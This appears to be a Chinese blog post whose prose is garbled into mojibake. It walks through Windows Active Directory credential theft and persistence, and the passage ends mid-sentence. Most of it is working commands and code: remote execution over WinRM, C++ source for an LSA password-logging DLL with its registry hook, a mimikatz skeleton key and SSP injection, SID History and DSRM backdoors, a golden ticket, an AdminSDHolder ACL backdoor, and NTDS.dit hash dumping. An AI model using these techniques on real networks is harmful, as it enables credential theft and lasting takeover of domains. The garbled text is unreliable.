winRmï¼ˆå¾®è½¯è¿œç¨‹ç®¡ç†ï¼‰æ˜¯WS-Managementåè®®çš„å®ç°ç»„ä»¶ã€‚WinRMæ˜¯windowsæ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚æ˜¯ä¸€é¡¹å…è®¸ç®¡ç†å‘˜åœ¨ç³»ç»Ÿä¸Šè¿œç¨‹æ‰§è¡Œç®¡ç†ä»»åŠ¡çš„æœåŠ¡ã€‚é€šä¿¡é€šè¿‡HTTPï¼ˆ5985ï¼‰æˆ–HTTPS SOAPï¼ˆ5986ï¼‰æ‰§è¡Œï¼Œé»˜è®¤æƒ…å†µä¸‹æ”¯æŒKerberoså’ŒNTLMèº«ä»½éªŒè¯ä»¥åŠåŸºæœ¬èº«ä»½éªŒè¯ã€‚ ä½ éœ€è¦ç®¡ç†å‘˜èº«ä»½æ‰èƒ½ä½¿ç”¨å®ƒã€‚â€‹ é€‚ç”¨ç‰ˆæœ¬:é€‚ç”¨äº Win server 2008 / Win7 åŠä»¥åçš„ç³»ç»Ÿï¼Œä½†æ˜¯ Win server 2008 / PC å…¨ç‰ˆæœ¬ç³»ç»Ÿé»˜è®¤å…³é—­ã€‚åªæœ‰åœ¨Win server 2012 ä¹‹åçš„ç‰ˆæœ¬çš„WinRMæœåŠ¡æ‰é»˜è®¤å¯åŠ¨å¹¶ç›‘å¬äº†5985ç«¯å£ï¼Œå…è®¸è¿œç¨‹ä»»æ„ä¸»æœºæ¥ç®¡ç†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹powershellå‘½ä»¤æŸ¥çœ‹æœºå™¨ä¸Šçš„winrmæ˜¯å¦æ­£å¸¸è¿è¡Œ Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125; è‹¥æ²¡å¼€å¯ï¼Œä½ å¯ä»¥åœ¨ç®¡ç†å‘˜æƒé™ä¸‹æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤å¼€å¯ winrm quickconfig -qorEnable-PSRemoting -Force è¿œç¨‹å‘½ä»¤æ‰§è¡Œ winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% whoami åˆ©ç”¨ç»„ç­–ç•¥è¯»å–è„šæœ¬ä¸­çš„å¯†ç å‡è®¾åŸŸç®¡æƒ³é€šè¿‡ç»„ç­–ç•¥æ¥ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œå¦‚æœä»–ä¸ä½¿ç”¨GPPï¼Œé‚£ä¹ˆä»–åªæœ‰é€šè¿‡GPOé…åˆè„šæœ¬ä¸‹å‘çš„æ–¹å¼æ¥ä¿®æ”¹ç”¨æˆ·å¯†ç ã€‚ è¿™ç§è„šæœ¬å¯èƒ½ä¼šé•¿å¾—åƒè¿™æ · strComputer &#x3D; &quot;.&quot;Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)objUser.SetPassword &quot;123QWEQWE!@#&quot;objUser.SetInfo ä¿å­˜è¿™ä¸ªè„šæœ¬ä¸ºcpass.vbs,è¿™ä¸ªè„šæœ¬çš„ä½œç”¨å°±æ˜¯ä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·çš„å¯†ç ä¸º 123QWEQWE!@# ç„¶åé€šè¿‡GPOä¸‹å‘æ­¤è„šæœ¬ï¼Œè¯¥è„šæœ¬å°±ä¼šè¢«ä¿å­˜äºSYSVOLæ–‡ä»¶å¤¹ä¸­ã€‚åˆå› ä¸ºåŸŸä¸­ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è¯»å–SYSVOLæ–‡ä»¶å¤¹ä¸­å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æŒ‡ä¸å®šå°±ä¼šç¿»åˆ°è¿™ç§æš´éœ²æ˜æ–‡å¯†ç çš„è„šæœ¬ã€‚ for &#x2F;r \\\\dc&#x2F;sysvol %i in (*.vbs) do @echo %ifor &#x2F;r \\\\dc&#x2F;sysvol %i in (*.bat) do @echo %i æ‰¹é‡å¯†ç åŸŸç®¡å¯èƒ½ä¼šç”¨ç»„ç­–ç•¥æ‰¹é‡ä¿®æ”¹åŸŸä¸­ç”¨æˆ·å¯†ç ï¼ˆç‰¹åˆ«æ˜¯æœ¬åœ°ç®¡ç†å‘˜ï¼‰ã€‚æ‰€ä»¥æ‹¿åˆ°ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜å¯†ç åä¸å¦¨è¯•è¯•å¯†ç å¤ç”¨ï¼ŒæŒ‡ä¸å®šå°±æœ‰æƒŠå–œ åŸŸç®¡æƒé™ç»´æŒHook PasswordChangeNotifyåŸç†ï¼šå½“ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ä¼šè¾“å…¥æ˜æ–‡å¯†ç ï¼ŒLSAä¼šè°ƒç”¨PasswordChangeNotify åœ¨ç³»ç»Ÿä¸­åŒæ­¥å¯†ç ã€‚æˆ‘ä»¬HOOKè¿™ä¸ªå‡½æ•°ï¼Œæ”¹å˜å…¶è¡Œä¸ºï¼Œå°±èƒ½è¾¾åˆ°è·å–ç”¨æˆ·ä¿®æ”¹åçš„å¯†ç çš„æ˜æ–‡. Tool: Powersploitä¸‹çš„Invoke-ReflectivePEInjection.ps1 ï¼ˆç”¨äºæ³¨å…¥ï¼‰https://github.com/PowerShellMafia/PowerSploitä»¥åŠ https://github.com/clymb3r/Misc-Windows-Hacking çš„HookPasswordChange.dll(éœ€è‡ªè¡Œç¼–è¯‘) Import-Module .\\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤ï¼Œåªè¦ä¿®æ”¹äº†ç”¨æˆ·çš„å¯†ç ï¼Œä¿®æ”¹åçš„æ˜æ–‡å¯†ç å°±ä¼šè®°å½•åœ¨ C:\\Windows\\Temp\\passwords.txt æ–‡ä»¶ä¸­ã€‚ ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹åŸç† å½“å¯†ç æ”¹å˜è¯·æ±‚å‘ç”Ÿæ—¶ï¼ŒLSAä¼šè°ƒç”¨Password Filtersã€‚æ¯ä¸€ä¸ªpassword filterä¼šå…ˆéªŒè¯æ–°å¯†ç çš„åˆæ³•æ€§å’Œå¤æ‚åº¦ï¼Œç„¶åLSAä¼šå‘å‡ºè¯·æ±‚å·²æ›´æ”¹çš„ä¿¡å·ã€‚ è¯¥è¿‡ç¨‹ç”± password notification DLL å®Œæˆã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åŠ«æŒè¿™ä¸ªDLLï¼ŒæŠŠå®ƒæ¢æˆæˆ‘ä»¬è‡ªå®šä¹‰çš„DLLå³å¯è¾¾åˆ°ç›®çš„ã€‚è¿™ç§æ–¹å¼ä¸€èˆ¬åœ¨ServeræœåŠ¡å™¨ä¸Šåˆ©ç”¨ç‡è¾ƒé«˜é€šå¸¸æ¥è¯´ï¼Œè¿™ä¸ªdllæ–‡ä»¶çš„åœ¨æ³¨å†Œè¡¨ä¸­çš„è·¯å¾„æ˜¯ hklm\\system\\currentcontrolset\\control\\lsaçš„ notification packagesè¡¨é¡¹ã€‚ æˆ‘ä»¬è¦åˆ©ç”¨è¯¥æ–¹æ³•ï¼Œé¦–å…ˆè¦ç¡®ä¿å¯†ç ç­–ç•¥å·²å¯ç”¨ è‡³äºå‘½ä»¤è¡Œæ€ä¹ˆä¿®æ”¹ã€‚å¯ä»¥è¿™æ · secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet å°†ç»„ç­–ç•¥å¯¼å‡ºä¸ºæ–‡ä»¶åœ¨è¯¥æ–‡ä»¶é‡Œå°†PasswordComplexityé¡¹å€¼ä¿®æ”¹ä¸º1ç„¶åç”¨secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet å°†å…¶å¯¼å…¥æ•°æ®åº“åˆ·æ–°ç»„ç­–ç•¥ï¼š gpupdate&#x2F;forceé‡å¯åç”Ÿæ•ˆ ä¸‹é¢æˆ‘ä»¬æ„é€ dllæ–‡ä»¶å»è¦†ç›–å®ƒã€‚ é¦–å…ˆæˆ‘ä»¬çš„dllæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚ #include&lt;Windows.h&gt;#include&lt;NTSecAPI.h&gt;#include &lt;fstream&gt;extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123; OutputDebugString(L&quot;InitializeChangeNotify&quot;); return TRUE;&#125;extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter( PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)&#123; OutputDebugString(L&quot;PasswordFilter&quot;); return TRUE;&#125;extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify( PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)&#123; FILE *pFile; fopen_s(&amp;pFile, &quot;C:\\\\logFile.txt&quot;, &quot;a+&quot;); fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer); return 0;&#125; ç„¶åæŠŠè¿™ä¸ªdllæ–‡ä»¶æ”¾å…¥system32æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿ hklm\\system\\currentcontrolset\\control\\lsaçš„ notification packagesè¡¨é¡¹åŒ…æ‹¬æˆ‘ä»¬çš„æ¶æ„dllæ–‡ä»¶ï¼Œå…·ä½“å‘½ä»¤è¡Œæ“ä½œå¦‚ä¸‹ REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f é‡å¯åç”Ÿæ•ˆã€‚æ— å¥ˆçš„æ˜¯æˆ‘æŠŠdllæ–‡ä»¶å†™å‡ºæ¥äº†ä¸”ç¡®ä¿æ˜¯æ­£ç¡®çš„ï¼Œåœ¨win7å’Œwin2012ä¸Šå¤ç°å‡å¤±è´¥ï¼Œç½‘ä¸ŠæˆåŠŸçš„ä¾‹å­æ˜¯win2008serverï¼Œå¯æƒœæˆ‘å¹¶æ²¡æœ‰è¿™ä¸ªç‰ˆæœ¬çš„è™šæ‹Ÿæœºä¸è¿‡åŸç†å€’æ˜¯æ‡‚äº† ä¸‡èƒ½å¯†ç è¿ç”¨mimkatzå¯ä»¥åœ¨åŸŸæ§æœºä¸Šå¯¹æ‰€æœ‰ç”¨æˆ·æ·»åŠ ä¸€ä¸ªç»Ÿä¸€å¯†ç ç”¨æ¥ç™»å½•. mimikatz# privilege::debugmimikatz# misc::skeleton ç„¶åæ‰€æœ‰ç”¨æˆ·éƒ½èƒ½ç”¨å¯†ç  mimiaktzç™»é™†äº† SSPæ³¨å…¥ssp:ä¸€ä¸ªDLLæ–‡ä»¶ï¼Œç”¨æ¥å®ç°Windowsèº«ä»½éªŒè¯åŠŸèƒ½ï¼Œæ¯”å¦‚kerberosï¼Œntlmã€‚ç³»ç»Ÿå¯åŠ¨æ—¶SSPä¼šè¢«è‡ªåŠ¨åŠ è½½å…¥lsass.exesspi:SSPçš„APIæ¥å£ å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸ªæ¶æ„dllæ–‡ä»¶è®©ä»–åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½åˆ°lsass.exe,å°±èƒ½å¾—åˆ°è¿›ç¨‹ä¸­çš„æ˜æ–‡å¯†ç  ä¸´æ—¶æ€§æ³¨å…¥(é‡å¯ä¾¿å¤±æ•ˆ) mimikatz# privilege::debugmimiaktz# misc::memssp æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤, ç„¶ååªè¦ç›®æ ‡æœºå™¨ä¸é‡å¯ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç å°†ä¼šè¢«è®°å½•åœ¨ C:\\Windows\\System32\\mimilsa.log æ–‡ä»¶ä¸­ã€‚ é•¿æœŸæ€§æ³¨å…¥ï¼ˆé‡å¯ä¸å¤±æ•ˆï¼‰ æŠŠ mimikatzä¸­çš„mimilib.dllæ”¾åˆ°ç³»ç»Ÿçš„C:\\Windows\\System32\\ ç›®å½•ä¸‹ï¼Œå¹¶å°† mimilib.dll æ·»åŠ åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå³ä½¿ç³»ç»Ÿé‡å¯ï¼Œä¹Ÿä¸ä¼šå½±å“æŒä¹…åŒ–æ•ˆæœã€‚ ä¿®æ”¹æ³¨å†Œè¡¨ HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa çš„ Security Packages é¡¹ï¼ŒåŠ è½½æ–°çš„DLLæ–‡ä»¶ ç”¨æˆ·åœ¨ç™»å½•æ—¶è¾“å…¥çš„è´¦å·å¯†ç å°†ä¼šè¢«è®°å½•åœ¨ C:\\Windows\\System32\\kiwissp.log SID Historyåé—¨sid history:å½“æˆ‘ä»¬æŠŠåŸŸAçš„ç”¨æˆ·xè¿ç§»åˆ°åŸŸBæ—¶ï¼ŒBåŸŸä¸­xçš„sidä¼šå‘ç”Ÿæ”¹å˜ï¼Œéšå³è€Œæ¥çš„æ˜¯æƒé™ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ã€‚æ‰€ä»¥ä¸ºäº†é¿å…è¿™ç§æƒé™æ”¹å˜ï¼Œsid historyè¯ç”Ÿäº†ï¼Œ ç³»ç»Ÿä¼šå°†å…¶åŸæ¥çš„SIDæ·»åŠ åˆ°è¿ç§»åç”¨æˆ·çš„SID Historyå±æ€§ä¸­ï¼Œä½¿è¿ç§»åçš„ç”¨æˆ·ä¿æŒåŸæœ‰æƒé™ã€èƒ½å¤Ÿè®¿é—®å…¶åŸæ¥å¯ä»¥è®¿é—®çš„èµ„æº ã€‚ åœ¨åŸŸæ§ä¸Š privilege::debugsid::patchsid::add &#x2F;sam:const27 &#x2F;new:administrator å°†administratorçš„SIDæ·»åŠ åˆ°const27çš„sid historyå±æ€§ ç„¶åå¯ä»¥åœ¨åŸŸæ§ä¸ŠéªŒè¯å…¶sid historyæ˜¯å¦æ›´æ”¹æˆåŠŸ Import-Module activedirectoryGet-ADUser const27 -Properties sidhistory å¯ä»¥å‘ç°ç°åœ¨æ˜¯æœ‰SIDHistoryå±æ€§äº†ã€‚è€Œä¸”æœ«å°¾çš„500é¢„ç¤ºç€ADMINæƒé™ DSRMåé—¨DSRMè´¦å·:æ¯ä¸ªåŸŸæ§ä¸Šéƒ½æœ‰ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ä¹Ÿå°±æ˜¯DSRMè´¦æˆ·ï¼Œç”¨äºåœ¨åŸŸç¯å¢ƒå‡ºç°æ•…éšœæ—¶æœ¬åœ°ç™»å½•è¿›è¡Œä¿®å¤.å¯ä»¥åˆ©ç”¨è¿™ä¸ªè´¦æˆ·è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚ï¼ˆ å¦‚æœåŸŸæ§åˆ¶å™¨çš„ç³»ç»Ÿç‰ˆæœ¬ä¸ºWindows Server 2003ï¼Œåˆ™ä¸èƒ½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚ ï¼‰ æˆ‘ä»¬å…ˆè®¾ç½®DSRMå¯†ç åŸŸæ§ä¸Šè¾“å…¥ntdsutilç„¶åè¾“å…¥reset password on server nullç„¶åé”®å…¥å¯†ç ï¼Œæœ€åæŒ‰qé€€å‡ºå³å¯ åœ¨mimikatzä¸­dumpæœ¬åœ°hashå¯ä»¥çœ‹åˆ°å¤šå‡ºæ¥ä¸ªAdministrator ç„¶åè®¾ç½®DSRMç™»é™†æ–¹å¼DSRMç™»é™†æ–¹å¼æœ‰ä¸‰ç§åˆ†åˆ«å¯¹åº”123. 0ï¼šé»˜è®¤å€¼ï¼Œåªæœ‰å½“åŸŸæ§åˆ¶å™¨é‡å¯å¹¶è¿›å…¥DSRMæ¨¡å¼æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨DSRMç®¡ç†å‘˜è´¦å· 1ï¼šåªæœ‰å½“æœ¬åœ°ADã€DSæœåŠ¡åœæ­¢æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨DSRMç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨ 2ï¼šåœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨DSRMç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨ æˆ‘ä»¬éœ€è¦å°†ä»–æ”¹æˆ2æ‰è¡Œã€‚powershellæ‰§è¡Œ New-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD å³å¯.ç„¶åç›´æ¥psexecç™»å½•(è¿™é‡Œç”¨çš„æ˜¯cs) æ³¨æ„å¡«Realmæ—¶è¦å¡«ä¸Šé¢dumpå‡ºsamæ—¶çš„åŸŸåï¼ˆè¿™é‡Œæ˜¯DCï¼‰ å§”æ´¾åé—¨è¿™ä¸ªå¾ˆç®€å•ï¼Œåˆ©ç”¨çº¦æŸæ€§å§”æ´¾æˆ–è€…åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»å¾—åˆ°çš„ST2ä¿å­˜èµ·æ¥ï¼Œæˆ–è€…éçº¦æŸæ€§å§”æ´¾å¾—åˆ°çš„TGTï¼Œè¦ç”¨çš„æ—¶å€™åŠ è½½è¿›å†…å­˜å°±è¡Œäº† é»„é‡‘ç¥¨æ®ç”Ÿæˆ#ææƒprivilege::debug #ç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶å¯¼å…¥kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:å½“å‰ç”¨æˆ·sidå»æ‰æœ€åä¸€ä¸ªæ•°æ® &#x2F;krbtgt:krbtgtçš„hash &#x2F;ptt AdminSDHolderAdminSDHolderæ˜¯ä¸€ä¸ªç‰¹æ®Šå®¹å™¨ï¼Œç”¨ä½œå—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„çš„ACMæ¨¡æ¿ã€‚ADå®šæœŸæŠŠ AdminSDHolderå¯¹è±¡çš„ACL åº”ç”¨åˆ°æ‰€æœ‰å—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„ä¸Šï¼Œé˜²æ­¢å…¶è¢«æœ‰æ„æˆ–æ•…æ„ä¿®æ”¹ã€‚ å¦‚æœèƒ½å¤Ÿä¿®æ”¹AdminSDHolderå¯¹è±¡çš„ACLï¼Œé‚£ä¹ˆä¿®æ”¹çš„æƒé™å°†è‡ªåŠ¨åº”ç”¨äºæ‰€æœ‰å—ä¿æŠ¤çš„ADè´¦æˆ·å’Œç»„ï¼Œè¿™å¯ä»¥ä½œä¸ºä¸€ä¸ªåŸŸç¯å¢ƒæƒé™ç»´æŒçš„æ–¹æ³• ã€‚ å¦‚ä½•å¯»æ‰¾å—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„ï¼š å—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„çš„ AdminCountå±æ€§ä¸º1 ã€‚ ä½†æ˜¯ï¼Œå¦‚æœå¯¹è±¡å·²ç§»å‡ºå—ä¿æŠ¤ç»„ï¼Œå…¶AdminCountå±æ€§ä»ä¸º1ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å¯èƒ½è·å¾—æ›¾ç»æ˜¯å—ä¿æŠ¤ç»„çš„å¸æˆ·å’Œç»„ ã€‚ ä½¿ç”¨powerview.ps1Get-NetUser -AdminCountå³å¯è·å¾—å—ä¿æŠ¤ç”¨æˆ·Get-NetGroup -AdminCountå³å¯è·å¾—å—ä¿æŠ¤ç»„ å¦‚ä½•ä¿®æ”¹ADMINSDHOLDERçš„ACL åŸŸç®¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤(powerview.ps1) Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALLç»™AdminSDHoloderæ·»åŠ ä¸€æ¡ACL,è®©xxç”¨æˆ·è·å¾—å®Œå…¨æ§åˆ¶æƒ ç„¶åé»˜è®¤ç­‰60åˆ†é’Ÿï¼Œå¾…ADMINSDHOLDERç”Ÿæ•ˆåï¼Œxxå°±è·å¾—æ‰€æœ‰å—ä¿æŠ¤å¯¹è±¡çš„å®Œå…¨æ§åˆ¶æƒäº† Ntds.ditâ€œNtds.ditæ–‡ä»¶æ˜¯åŸŸç¯å¢ƒä¸­åŸŸæ§ä¸Šä¼šæœ‰çš„ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ä¸»è¦çš„æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œå…¶æ–‡ä»¶è·¯å¾„ä¸ºåŸŸæ§çš„ %SystemRoot%\\ntds\\ntds.ditï¼Œæ´»åŠ¨ç›®å½•å§‹ç»ˆä¼šè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ–‡ä»¶ç¦æ­¢è¢«è¯»å–ã€‚Ntds.ditåŒ…æ‹¬ä½†ä¸é™äºæœ‰å…³åŸŸç”¨æˆ·ã€ç»„å’Œç»„æˆå‘˜èº«ä»½å’Œå‡­æ®ä¿¡æ¯ã€GPPç­‰ä¿¡æ¯ã€‚å®ƒåŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚â€â€”â€”FREEBUF.whoamiã€Šå†…ç½‘æ¸—é€æµ‹è¯•ï¼šä»NTDS.ditè·å–åŸŸæ•£åˆ—å€¼ã€‹æ’ä¸ªé¢˜å¤–è¯ï¼šéåŸŸçš„å·¥ä½œç»„ä¸»æœºå…¶å¯†ç ç­‰ä¿¡æ¯å­˜å‚¨åœ¨SAMä¸­ã€‚ æˆ‘ä»¬è·å–äº†åŸŸæ§åä¸€èˆ¬ç¬¬ä¸€æ­¥ä¾¿æ˜¯å¯¼å‡ºNtds.ditä¸­çš„ä¿¡æ¯,æ€ä¹ˆå¯¼å‡ºå‘¢ï¼Ÿ åˆ©ç”¨VSSå¯¼å‡ºVSSå…¨ç§°ä¸ºVolume Shadow Copy Serviceï¼Œå·å½±æ‹·è´æœåŠ¡ï¼Œå±äºå¿«ç…§æŠ€æœ¯çš„ä¸€ç§ï¼Œä¸»è¦ç”¨äºå¤‡ä»½å’Œæ¢å¤ï¼Œå³ä½¿æ–‡ä»¶å¤„äºè¢«é”å®šçŠ¶æ€ã€‚ å…¶è·å–NTDS.DITçš„åŸºæœ¬æ­¥éª¤ä¸ºï¼š åˆ›å»ºç›®æ ‡ä¸»æœºæ‰€æœ‰æ–‡ä»¶çš„å·å½±æ‹·è´ã€‚åœ¨åˆ›å»ºçš„å·å½±æ‹·è´ä¸­å¤åˆ¶å‡ºNTDS.DITã€‚åˆ é™¤å·å½±æ‹·è´ã€‚ VSSADMINvssadminæ˜¯windowsä¸Šä¸€ä¸ªå‘½ä»¤è¡Œå·å½±æ‹·è´æœåŠ¡ç®¡ç†å·¥å…·ã€‚å…¶é€‚ç”¨äºï¼š Windows 10ï¼ŒWindows 8.1ï¼ŒWindows Server 2016ï¼ŒWindows Server 2012 R2ï¼ŒWindows Server 2012ï¼ŒWindows Server 2008 R2ï¼ŒWindows Server 2008 å…¶å¯¼å‡ºNTDS.DITçš„æ–¹æ³•å¦‚ä¸‹ åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´ vssadmin create shadow &#x2F;for&#x3D;c: ç„¶åå°†å·å½±ä¸­çš„ntds.ditå¤åˆ¶å‡ºæ¥ copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\ntds.dit ç„¶ååˆ é™¤å·å½± vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet Ntdsutil.exeNtdsutil.exe æ˜¯ä¸€ä¸ªä¸º Active Directory æä¾›ç®¡ç†è®¾æ–½çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¯¥å·¥å…·è¢«é»˜è®¤å®‰è£…åœ¨äº†åŸŸæ§åˆ¶å™¨ä¸Šï¼Œå¯ä»¥åœ¨åŸŸæ§ä¸Šç›´æ¥æ“ä½œï¼Œä¹Ÿå¯ä»¥é€šè¿‡åŸŸå†…æœºå™¨åœ¨åŸŸæ§ä¸Šè¿œç¨‹æ“ä½œï¼Œä½†æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚ ä¸ºWINDOWSä¸Šæ‰€æœ‰æ–‡ä»¶åˆ›å»ºå¿«ç…§ ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit æˆ‘ä»¬å¾—åˆ°äº†ä¸ªå¿«ç…§çš„IDï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦åŠ è½½è¿™ä¸ªå·å½±åˆ°æˆ‘ä»¬çš„ç£ç›˜ä¸­ ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit æ‰§è¡Œåå°±ä¼šå‘ç°è¿™ä¸ªå¿«ç…§åŠ è½½åˆ°äº†Cç›˜ä¸‹ï¼ˆè¿™é‡Œdirçœ‹åˆ°çš„NTDS.DITä¸æœ¬æ¬¡å®éªŒæ— å…³ï¼Œæ˜¯ä¸Šæ¬¡å®éªŒæ®‹ç•™ä¸‹æ¥æ²¡åˆ çš„ï¼‰ ç„¶åå°†ntds.ditå¤åˆ¶å‡ºæ¥ copy c:\\$SNAP_202107291703_VOLUMEC$\\Windows\\NTDS\\ntds.dit c:\\ntds.dit ç„¶ååˆ é™¤å¿«ç…§ ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; &quot;delete &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit åŒæ—¶ï¼ŒNTDSUTILè¿˜æœ‰ä¸€ä¸ªæ›´åŠ ä¾¿æ·çš„å¯¼å‡ºntds.ditçš„æ–¹æ³•ï¼šé€šè¿‡IFMIFMä¸­æ–‡å«åª’ä½“å®‰è£…é›†ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡NTDSUTILæ¥åˆ›å»ºåª’ä½“å®‰è£…é›†æ—¶ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œç”Ÿæˆå¿«ç…§ã€åŠ è½½ã€å°†ntds.ditã€è®¡ç®—æœºçš„SAMå’ŒSYSTEMæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶å¤¹ä¸­ç­‰æ“ä½œï¼Œéœ€ç®¡ç†å‘˜æƒé™ã€‚ ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q ç„¶ååœ¨C:\\test\\Active Directory\\ntds.ditï¼Œå°±æ˜¯NTDS.DITï¼Œæˆ‘ä»¬å¤åˆ¶å‡ºæ¥å°±è¡Œäº†ã€‚ç„¶åå†æŠŠtestæ–‡ä»¶å¤¹åˆ é™¤å³å¯ã€‚ è§£æNTDS.DITåœ¨æå–NTDS.DITåï¼Œæˆ‘ä»¬éœ€è¦å†æå–ä¸€ä¸ªæ–‡ä»¶system.hiveï¼Œå› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€NTDS.DITçš„å¯†é’¥ï¼Œæœ‰äº†å®ƒæˆ‘ä»¬æ‰èƒ½è§£æNTDS.DITã€‚ å¯ä»¥ç”¨åˆšåˆšæåˆ°çš„VSSæ–¹æ³•è·å–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä»¥ä¸‹å‘½ä»¤ä»æ³¨å†Œè¡¨ä¸­æ‹‰å–. reg save hklm\\system c:\\system.hive Impacketimpacketæ¡†æ¶é›†æˆäº†è®¸å¤šå¥½ç©çš„ä¸œè¥¿ï¼Œä»–å…¶ä¸­çš„secretdump.pyè„šæœ¬å®ç°äº†è§£æntds.ditçš„åŠŸèƒ½ ç›´æ¥å†impacketçš„exampleä¸‹ python .\\secretsdump.py -system .\\system.hive -ntds .\\ntds.dit local è¿œç¨‹è§£æDCSYNCâ€œDCSyncæ˜¯Mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE 